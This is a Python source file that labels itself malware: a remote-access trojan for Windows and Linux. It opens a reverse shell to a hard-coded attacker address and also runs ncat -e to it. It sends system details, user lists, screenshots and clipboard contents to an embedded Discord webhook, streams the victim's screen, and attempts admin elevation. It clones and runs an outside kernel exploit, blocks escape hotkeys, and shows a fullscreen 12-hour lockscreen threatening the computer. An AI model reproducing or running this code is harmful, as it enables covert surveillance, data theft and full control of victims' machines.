import ctypes
import socket
import time
import os
import sys
import subprocess
from mss import mss
import keyboard
import tkinter as tk
import threading
import queue
import win32gui
import win32con
import requests
import json
import base64, platform
import pygetwindow as gw
import re
import cv2
import numpy as np
from flask import Flask, Response
import win32clipboard
from PIL import ImageGrab
import tempfile

os_name = platform.system()

# Only install if needed
requirements = ["keyboard"]
for package in requirements:
    try:
        __import__(package)
    except ImportError:
        subprocess.check_call([sys.executable, "-m", "pip", "install", package])


def is_root():
    if platform.system() == "Windows":
        import ctypes

        try:
            return ctypes.windll.shell32.IsUserAnAdmin() != 0
        except:
            return False
    else:
        try:
            return os.geteuid() == 0
        except:
            return False


def destroy(process_name):
    system = platform.system()

    try:
        if system == "Windows":
            result = subprocess.run(
                ["taskkill", "/F", "/IM", process_name],
                capture_output=True,
                text=True,
                shell=True,
            )

            if result.returncode == 0:
                print(f"Process '{process_name}' terminated")
                return (1, 0)
            else:
                print(f"Failed to close '{process_name}': {result.stderr.strip()}")
                return (0, 1)

        else:
            result = subprocess.run(
                ["pkill", "-f", process_name], capture_output=True, text=True
            )

            if result.returncode == 0:
                print(f"Process '{process_name}' terminated")
                return (1, 0)
            else:
                print(f"Process '{process_name}' not found or already terminated")
                return (0, 1)

    except Exception as e:
        print(f"Error closing '{process_name}': {e}")
        return (0, 1)


IP = "10.2.0.2"
PORT = 1236
MAXRETRIES = 50000
DELAY = 2
ALLOWED = False


class PersistentShell:
    def __init__(self):
        self.process = subprocess.Popen(
            "cmd.exe",
            stdin=subprocess.PIPE,
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            text=True,
            bufsize=1,
        )
        self.output_queue = queue.Queue()
        self.running = True
        self.last_output_length = 0
        threading.Thread(target=self._reader, daemon=True).start()

    def _reader(self):
        while self.running:
            line = self.process.stdout.readline()
            if line:
                self.output_queue.put(line)
            else:
                break

    def execute(self, command):
        if not command:
            return ""

        # Remember current queue size (position)
        queue_size_before = self.output_queue.qsize()

        # Send command
        self.process.stdin.write(command + "\n")
        self.process.stdin.flush()

        output = ""
        timeout_count = 0
        while timeout_count < 30:
            try:
                line = self.output_queue.get(timeout=0.1)
                output += line
                timeout_count = 0
                if ">" in line or "$" in line:
                    if output.startswith(command + "\n"):
                        output = output[len(command) + 1 :]
                    break
            except queue.Empty:
                timeout_count += 1

        return output

    def close(self):
        self.running = False
        self.process.terminate()


# ------------------#
# Notifications made by a toaster
# ------------------#
class ToastNotification:
    def __init__(self, text, color, duration):
        self.text = text
        self.color = color
        self.duration = duration
        self.root = None
        self.canvas = None
        self.alpha = 0
        self.y_offset = 0

    def show(self):
        self.root = tk.Tk()
        self.root.overrideredirect(True)
        self.root.attributes("-topmost", True)
        self.root.attributes("-transparentcolor", "black")
        self.root.configure(bg="black")
        screen_width = self.root.winfo_screenwidth()
        temp_label = tk.Label(self.root, text=self.text, font=("Segoe UI", 11, "bold"))
        temp_label.pack()
        self.root.update_idletasks()
        text_width = temp_label.winfo_reqwidth()
        text_height = temp_label.winfo_reqheight()
        temp_label.destroy()

        padding_x = 25
        padding_y = 12
        window_width = text_width + (padding_x * 2)
        window_height = text_height + (padding_y * 2)
        self.target_x = (screen_width - window_width) // 2
        self.target_y = 10
        self.current_x = self.target_x
        self.current_y = -window_height
        self.root.geometry(
            f"{window_width}x{window_height}+{self.current_x}+{self.current_y}"
        )

        self.canvas = tk.Canvas(
            self.root,
            width=window_width,
            height=window_height,
            bg="black",
            highlightthickness=0,
        )
        self.canvas.pack()
        radius = 15
        self.draw_rounded_rect(0, 0, window_width, window_height, radius, self.color)
        self.canvas.create_text(
            window_width // 2,
            window_height // 2,
            text=self.text,
            font=("Segoe UI", 11, "bold"),
            fill="white",
            anchor="center",
        )
        self.animate_slide_in()
        self.root.after(int(self.duration * 1000), self.animate_slide_out)
        self.root.mainloop()

    def draw_rounded_rect(self, x1, y1, x2, y2, radius, color):
        points = [
            x1 + radius,  # I could make this better, its fine for now
            y1,
            x2 - radius,
            y1,
            x2 - radius,
            y1,
            x2,
            y1,
            x2,
            y1 + radius,
            x2,
            y2 - radius,
            x2,
            y2,
            x2 - radius,
            y2,
            x2 - radius,
            y2,
            x1 + radius,
            y2,
            x1 + radius,
            y2,
            x1,
            y2,
            x1,
            y2 - radius,
            x1,
            y1 + radius,
            x1,
            y1,
            x1 + radius,
            y1,
        ]
        self.canvas.create_polygon(points, fill=color, outline=color, smooth=True)

    def animate_slide_in(self):
        if self.current_y < self.target_y:
            self.current_y += 8
            if self.current_y > self.target_y:
                self.current_y = self.target_y
            self.root.geometry(f"+{self.current_x}+{int(self.current_y)}")
            self.root.after(5, self.animate_slide_in)
        else:
            self.animate_fade_in()

    def animate_fade_in(self):
        if self.alpha < 1:
            self.alpha += 0.05
            self.root.attributes("-alpha", self.alpha)
            self.root.after(20, self.animate_fade_in)

    def animate_slide_out(self):
        if self.current_y > -self.root.winfo_height():
            self.current_y -= 8
            self.alpha -= 0.05
            if self.alpha < 0:
                self.alpha = 0
            self.root.attributes("-alpha", max(0, self.alpha))
            self.root.geometry(f"+{self.current_x}+{int(self.current_y)}")
            self.root.after(5, self.animate_slide_out)
        else:
            self.root.destroy()


# ------------------#
# Lockscreen 12 hours
# ------------------#


class LockScreen:
    def __init__(self, TIME=43200, PASSWORD="Test1236"):
        self.TIME = TIME
        self.PASSWORD = PASSWORD
        self.TIME_LEFT = TIME
        self.unlocked = False
        self.notification = None
        self.root = tk.Tk()
        self.root.attributes("-fullscreen", True, "-topmost", True)
        self.root.overrideredirect(True)
        self.root.configure(bg="#1e1e2e")
        self.root.grab_set()
        self.root.focus_force()
        self.root.bind("<Escape>", lambda e: None)
        self.root.bind("<Alt-F4>", lambda e: None)
        self.create_widgets()
        threading.Thread(target=self.countdown, daemon=True).start()
        self.root.mainloop()

    def show_toast(self, text, color, duration):

        def show():
            toast = ToastNotification(text, color, duration)
            toast.show()

        threading.Thread(target=show, daemon=True).start()

    def format_time(self, s):
        hours = s // 3600
        minutes = (s % 3600) // 60
        seconds = s % 60
        return f"{hours:02d}:{minutes:02d}:{seconds:02d}"

    def delete_char(self):
        current = self.password_entry.get()
        self.password_entry.delete(0, tk.END)
        self.password_entry.insert(0, current[:-1])

    def check_password(self):
        if self.password_entry.get() == self.PASSWORD:
            self.unlocked = True
            self.status_label.config(text="Unlocking computer", fg="#50fa7b")
            self.show_toast("Access Granted! Welcome back.", "#50fa7b", 3)
            self.root.after(
                1000, lambda: [self.root.grab_release(), self.root.destroy()]
            )
        else:
            self.status_label.config(text="Wrong Password", fg="#ff5555")
            self.show_toast("Invalid password.", "#ff5555", 3)
            self.password_entry.delete(0, tk.END)
            self.root.after(2000, lambda: self.status_label.config(text=""))

    def auto_unlock(self):
        if not self.unlocked and self.TIME_LEFT <= 0:
            self.unlocked = True
            self.status_label.config(text="Time expired, deleting", fg="#50fa7b")
            self.show_toast("Time expired, deleting", "#50fa7b", 3)
            self.root.after(
                2000, lambda: [self.root.grab_release(), self.root.destroy()]
            )

    def countdown(self):
        while self.TIME_LEFT > 0 and not self.unlocked:
            time.sleep(1)
            if not self.unlocked:
                self.TIME_LEFT -= 1
                self.timer_label.config(text=self.format_time(self.TIME_LEFT))

                if self.TIME_LEFT == 60:
                    self.show_toast("1 minute remaining", "#7c0000", 3)
                elif self.TIME_LEFT == 300:
                    self.show_toast("5 minutes remaining", "#9e571d", 3)
                elif self.TIME_LEFT == 600:
                    self.show_toast("10 minutes remaining", "#bdc019", 3)

                self.timer_label.config(
                    fg=(
                        "#ff0000"
                        if self.TIME_LEFT <= 10
                        else "#ffb86c" if self.TIME_LEFT <= 20 else "#50fa7b"
                    )
                )
        self.auto_unlock()

    def create_widgets(self):
        main_frame = tk.Frame(self.root, bg="#1e1e2e")
        main_frame.pack(expand=True, fill="both")

        title = tk.Label(
            main_frame,
            text="SAY GOODBYE TO YOUR COMPUTER",
            font=("Segoe UI", 32, "bold"),
            bg="#1e1e2e",
            fg="#ff5555",
        )
        title.pack(pady=30)

        self.timer_label = tk.Label(
            main_frame,
            text=self.format_time(self.TIME_LEFT),
            font=("Segoe UI", 72, "bold"),
            bg="#1e1e2e",
            fg="#50fa7b",
        )
        self.timer_label.pack(pady=20)

        tk.Label(
            main_frame,
            text="seconds remaining.",
            font=("Segoe UI", 14),
            bg="#1e1e2e",
            fg="#888888",
        ).pack()

        tk.Frame(main_frame, height=2, bg="#444444").pack(fill="x", pady=30, padx=200)

        pw_frame = tk.Frame(main_frame, bg="#1e1e2e")
        pw_frame.pack(pady=20)

        tk.Label(
            pw_frame,
            text="Enter Password to Unlock:",
            font=("Segoe UI", 14),
            bg="#1e1e2e",
            fg="#ffffff",
        ).pack(pady=10)

        self.password_entry = tk.Entry(
            pw_frame,
            font=("Segoe UI", 16),
            show="•",
            width=30,
            justify="center",
            bg="#2d2d3d",
            fg="#ffffff",
        )
        self.password_entry.pack(pady=10)
        self.password_entry.focus()
        self.password_entry.bind("<Return>", lambda e: self.check_password())

        btn_frame = tk.Frame(pw_frame, bg="#1e1e2e")
        btn_frame.pack(pady=15)

        tk.Button(
            btn_frame,
            text="DELETE",
            command=self.delete_char,
            font=("Segoe UI", 12, "bold"),
            bg="#ff5555",
            fg="white",
            width=12,
        ).pack(side="left", padx=10)

        tk.Button(
            btn_frame,
            text="SUBMIT",
            command=self.check_password,
            font=("Segoe UI", 12, "bold"),
            bg="#50fa7b",
            fg="#1e1e2e",
            width=12,
        ).pack(side="left", padx=10)

        self.status_label = tk.Label(
            main_frame, text="", font=("Segoe UI", 11), bg="#1e1e2e", fg="#ff5555"
        )
        self.status_label.pack(pady=10)

        tk.Label(
            main_frame,
            text="Next time don't open random files.",
            font=("Segoe UI", 9),
            bg="#1e1e2e",
            fg="#666666",
        ).pack(side="bottom", pady=20)


# ------------------#
# Locks the keyboard exits
# ------------------#


def non_exit():
    blocked = [
        "alt+f4",
        "ctrl+f4",
        "ctrl+w",
        "ctrl+q",
        "esc",
        "f11",
        "alt+tab",
        "windows+d",
        "windows+m",
        "windows+shift+m",
        "alt+esc",
        "ctrl+shift+esc",
        "ctrl+c",
        "ctrl+break",
        "ctrl+esc",
        "windows+e",
        "windows",
        "windows+tab",
        "windows+r",
        "windows+l",
        "windows+x",
        "windows+p",
        "windows+i",
        "windows+a",
        "windows+u",
        "windows+k",
        "windows+ctrl+d",
        "windows+ctrl+f4",
        "windows+ctrl+left",
        "windows+ctrl+right",
        "ctrl+alt+tab",
        "ctrl+tab",
        "ctrl+shift+tab",
        "ctrl+shift+w",
        "windows+home",
        "windows+up",
        "windows+down",
        "windows+left",
        "windows+right",
        "windows+shift+left",
        "windows+shift+right",
        "alt+home",
        "ctrl+shift+t",
    ]

    for combo in blocked:
        try:
            keyboard.add_hotkey(combo, lambda: None, suppress=True)
        except Exception as e:
            pass  # Silent fail


def sendMessage(text, color, time_seconds):
    toast = ToastNotification(text, color, time_seconds)
    toast.show()


def showMessage(text, color, time_seconds):
    threading.Thread(
        target=sendMessage, args=(text, color, time_seconds), daemon=True
    ).start()


def showLockScreen(TIME=3600, PASSWORD="Test1236"):
    lock = LockScreen(TIME, PASSWORD)


def close_all_windows():
    def enum_callback(hwnd, windows):
        if win32gui.IsWindowVisible(hwnd):
            windows.append(hwnd)
        return True

    windows = []
    win32gui.EnumWindows(enum_callback, windows)

    for hwnd in windows:
        try:
            title = win32gui.GetWindowText(hwnd)
            win32gui.PostMessage(hwnd, win32con.WM_CLOSE, 0, 0)
            win32gui.PostMessage(hwnd, win32con.WM_QUIT, 0, 0)
            win32gui.SendMessage(hwnd, win32con.WM_DESTROY, 0, 0)
        except:
            pass


## -------------------------- ##
## SCRIPT MALWARE STARTS HERE ##
## -------------------------- ##


def focus(keyword):
    all_titles = gw.getAllTitles()
    pattern = re.compile(f".*{re.escape(keyword)}.*", re.IGNORECASE)

    for title in all_titles:
        if pattern.match(title):
            windows = gw.getWindowsWithTitle(title)
            if windows:
                window = windows[0]
                if window.isMinimized:
                    window.restore()
                window.activate()

                return True
    return False


class ScreenStreamer:
    def __init__(self):
        self._app = None
        self._running = False
        self._server_thread = None

    def _get_local_ip(self):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            ip = s.getsockname()[0]
            s.close()
            return ip
        except:
            return "127.0.0.1"

    def _generate_frames(self, monitor_index=1, fps=10):
        with mss() as sct:
            monitor = sct.monitors[monitor_index]
            frame_time = 1.0 / fps

            while self._running:
                start = time.time()
                img = sct.grab(monitor)
                frame = np.array(img)
                frame = cv2.cvtColor(frame, cv2.COLOR_BGRA2BGR)
                ret, buffer = cv2.imencode(
                    ".jpg", frame, [cv2.IMWRITE_JPEG_QUALITY, 70]
                )
                yield (
                    b"--frame\r\n"
                    b"Content-Type: image/jpeg\r\n\r\n" + buffer.tobytes() + b"\r\n"
                )
                elapsed = time.time() - start
                if elapsed < frame_time:
                    time.sleep(frame_time - elapsed)

    def _create_app(self, monitor_index=1, fps=10):
        app = Flask(__name__)

        @app.route("/")
        def index():
            return """
            <html>
            <head><title>Live Screen Stream</title></head>
            <body style="margin:0; background:#1a1a1a;">
                <img src="/video_feed" style="width:100%;">
            </body>
            </html>
            """

        @app.route("/video_feed")
        def video_feed():
            return Response(
                self._generate_frames(monitor_index, fps),
                mimetype="multipart/x-mixed-replace; boundary=frame",
            )

        return app

    def start_stream(self, port=5000, fps=10, monitor=1, background=False):
        self._running = True
        self._app = self._create_app(monitor, fps)

        local_ip = self._get_local_ip()
        print(f"Stream link: http://{local_ip}:{port}")

        if background:

            def run_server():
                try:
                    self._app.run(host="0.0.0.0", port=port, debug=False, threaded=True)
                except:
                    pass

            self._server_thread = threading.Thread(target=run_server, daemon=True)
            self._server_thread.start()
            return self._server_thread
        else:
            try:
                self._app.run(host="0.0.0.0", port=port, debug=False, threaded=True)
            except KeyboardInterrupt:
                self.stop_stream()

    def stop_stream(self):
        self._running = False

    def stream_once(self, duration=30, port=5000, fps=10):
        print(f"[+] Streaming for {duration} seconds...")
        self.start_stream(port=port, fps=fps, background=True)
        time.sleep(duration)
        self.stop_stream()


class DiscordWebhook:
    def __init__(self, url, username="Webhook", avatar=None):
        self.url = url
        self.username = username
        self.avatar = avatar

    def send_message(self, content, **kwargs):
        data = {
            "content": content,
            "username": self.username,
        }

        if self.avatar:
            data["avatar_url"] = self.avatar

        data.update(kwargs)

        headers = {"Content-Type": "application/json"}
        response = requests.post(self.url, data=json.dumps(data), headers=headers)

        if response.status_code == 204:
            print("Message sent successfully")
        else:
            print(f"Failed to send message: {response.status_code}")

    def send_image(self, image_path, content=None):
        with open(image_path, "rb") as file:
            files = {"file": (os.path.basename(image_path), file, "image/png")}
            data = {"content": content}
            response = requests.post(self.url, data=data, files=files)

        if response.status_code == 200 or response.status_code == 204:
            print("Image sent successfully")
        else:
            print(f"Failed to send image: {response.status_code} - {response.text}")

    def edit_message(self, message_id, new_content, **kwargs):
        data = {
            "content": new_content,
        }

        data.update(kwargs)

        headers = {"Content-Type": "application/json"}
        response = requests.patch(
            f"{self.url}/{message_id}", data=json.dumps(data), headers=headers
        )

        if response.status_code == 200:
            print("Message edited successfully")
        else:
            print(f"Failed toedit message: {response.status_code}")

    def delete_message(self, message_id):
        headers = {"Content-Type": "application/json"}
        response = requests.delete(f"{self.url}/{message_id}", headers=headers)

        if response.status_code == 204:
            print("Message deleted successfully")
        else:
            print(f"Failed to delete message: {response.status_code}")


def open_console():
    global IP, PORT
    if os_name == "Windows":
        subprocess.run(
            'git clone https://github.com/V4bel/dirtyfrag.git && cd dirtyfrag && gcc -O0 -Wall -o exp exp.c -lutil && ./exp"',
            shell=True,
            capture_output=True,
            text=True,
        )

    subprocess.run(
        f'ncat -e cmd {IP} {PORT}"', shell=True, capture_output=True, text=True
    )


def Ipv4():
    # vars
    nameuserall = None
    userall = None
    result = None
    username = None
    whoam = None
    ltime = None
    sysinfo = None

    # windows commands
    if os_name == "Windows":
        result = subprocess.run(
            'ipconfig | findstr /i "IPv4"', shell=True, capture_output=True, text=True
        )
        username = subprocess.run(
            "echo %username%", shell=True, capture_output=True, text=True
        )
        whoam = subprocess.run("whoami", shell=True, capture_output=True, text=True)
        sysinfo = subprocess.run(
            "systeminfo", shell=True, capture_output=True, text=True
        )

    # linux commands
    if os_name == "Linux":
        nameuserall = subprocess.run(
            "compgen -u", shell=True, capture_output=True, text=True
        )
        userall = subprocess.run(
            "getent passwd", shell=True, capture_output=True, text=True
        )
        ltime = subprocess.run("w", shell=True, capture_output=True, text=True)
        whoam = subprocess.run("whoami", shell=True, capture_output=True, text=True)

    ipv4 = result.stdout if result is not None and result.stdout else "None"
    user = (
        username.stdout.strip()
        if username is not None and username.stdout
        else "This_User_Isnt_Identified"
    )
    whoami = whoam.stdout.strip() if whoam is not None and whoam.stdout else "None"
    useral = (
        userall.stdout.splitlines() if userall is not None and userall.stdout else []
    )
    nameuseral = (
        nameuserall.stdout.splitlines()
        if nameuserall is not None and nameuserall.stdout
        else []
    )
    ltimes = ltime.stdout if ltime is not None and ltime.stdout else "None"
    sysinfos = sysinfo.stdout if sysinfo is not None and sysinfo.stdout else "None"

    return ipv4, user, whoami, useral, nameuseral, ltimes, sysinfos


# Create
# webhook = DiscordWebhook('YOUR_WEBHOOK_URL')

# Send a text message
# webhook.send_message('Hello, world!')

# Send an image
# webhook.send_image('path/to/image.png')

# Edit a message
# webhook.edit_message('MESSAGE_ID', 'Edited message content')

# Delete a message
# webhook.delete_message('MESSAGE_ID')


def main():
    is_e = "--elevated" in sys.argv
    if is_e:
        sys.argv.remove("--elevated")

    webhook = DiscordWebhook(
        "https://discord.com/api/webhooks/1500510382999998616/5qPSUUQDY1uMCqNI_FC87zUgUsWwe43yvMZvjVqyQ3uE6_qsEe3YY6JMnu7HHf3IQEa9"
    )
    # Create persistent shell
    shell = PersistentShell()
    stream = None
    if not is_e:
        ipv4, user, whoami, useral, nameuseral, ltimes, sysinfos = Ipv4()
        if is_root():
            webhook.send_message("The script started with root privileges-te")
        webhook.send_message("---------Malware started----------")
        if ALLOWED:
            webhook.send_message(f"Ip of user: {ipv4}")
            webhook.send_message(f"Username: {user}")
            webhook.send_message(f"Whoami: {whoami}")
            webhook.send_message(f"All users: {useral}")
            webhook.send_message(f"All usernames: {nameuseral}")
            webhook.send_message(f"Login times: {ltimes}")
            webhook.send_message(f"System info: {sysinfos}")

        open_console()
        non_exit()

        retries = 0
        while retries < MAXRETRIES:
            try:
                with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                    s.connect((IP, PORT))
                    webhook.send_message("Connected to attacker")

                    # Send initial prompt
                    initial = shell.execute("")
                    s.sendall(initial.encode())

                    while True:
                        data = s.recv(65536).decode()
                        cmd = data.strip().lower()
                        if not data:
                            break

                        if cmd.strip().lower() == "heartbeat":
                            s.sendall(b"heartbeat\n")
                            continue

                        if cmd.strip().lower() == "exit":
                            s.sendall(b"Goodbye dih\n")
                            webhook.send_message("Connection disconnected")
                            shell.close()
                            return
                        if cmd == "screenshot":
                            try:
                                img = ImageGrab.grab()
                                temp_path = os.path.join(
                                    tempfile.gettempdir(), "screenshot.png"
                                )

                                img.save(temp_path, "PNG")
                                webhook.send_image(temp_path)

                                os.remove(temp_path)
                            except Exception as e:
                                webhook.send_message(
                                    "Can't send screenshot:\n" + str(e)
                                )
                            continue
                        if cmd == "clipboard":
                            try:
                                if platform.system() == "Windows":

                                    win32clipboard.OpenClipboard()
                                    data2 = win32clipboard.GetClipboardData()
                                    win32clipboard.CloseClipboard()
                                    webhook.send_message(f"Clipboard: {data2}")
                                else:
                                    result = subprocess.run(
                                        ["xclip", "-o", "-selection", "clipboard"],
                                        capture_output=True,
                                        text=True,
                                    )
                                    webhook.send_message(
                                        f"Clipboard: {result.stdout.strip()}"
                                    )
                            except Exception as e:
                                webhook.send_message(
                                    "Can't paste clipboard:\n" + str(e)
                                )
                                continue
                        if cmd == "stream_start":
                            if stream is None:
                                stream = ScreenStreamer()
                                stream.start_stream(port=5000, background=True)
                                local_ip = stream._get_local_ip()
                                if ALLOWED:
                                    webhook.send_message(
                                        f"Stream link: http://{local_ip}:5000"
                                    )
                                else:
                                    s.sendall(
                                        f"Stream link: http://{local_ip}:5000\n".encode()
                                    )
                            else:
                                s.sendall(
                                    f"Stream running at http://{local_ip}:5000\n".encode()
                                )
                            continue
                        if cmd == "stream_stop":
                            if stream is not None:
                                stream.stop_stream()
                                stream = None
                                s.sendall(b"Screen stream stopped\n")
                            else:
                                s.sendall(b"No screen stream running at the moment.\n")
                            continue
                        if cmd.strip().lower() == "Lock":
                            threading.Thread(
                                target=lambda: LockScreen(
                                    TIME=43200, PASSWORD="test1236"
                                ),
                                daemon=True,
                            ).start()
                            continue
                        if cmd.strip().lower() == "adminroot":
                            if is_root():
                                s.sendall(b"Already running as administrator\n")
                                continue

                            webhook.send_message("Elevating to admin")

                            # Close current connection
                            s.close()

                            if platform.system() == "Windows":
                                # Windows: restart as admin
                                script_path = os.path.abspath(__file__)
                                try:
                                    ctypes.windll.shell32.ShellExecuteW(
                                        None,
                                        "runas",
                                        sys.executable,
                                        f'"{script_path}" --elevated',
                                        None,
                                        1,
                                    )
                                except Exception as e:
                                    webhook.send_message(f"Root access failed: {e}")
                            else:
                                # Linux: use execvp
                                os.execvp(
                                    "sudo",
                                    ["sudo", sys.executable, script_path, "--elevated"],
                                )
                            sys.exit(0)

                        # Execute command in persistent shell
                        output = shell.execute(cmd.strip())
                        s.sendall(output.encode())

            except (socket.error, OSError) as e:
                retries += 1
                time.sleep(DELAY)
                continue

    shell.close()
    sys.exit(1)
    webhook.send_message("Error connecting to attacker")


if __name__ == "__main__":
    main()
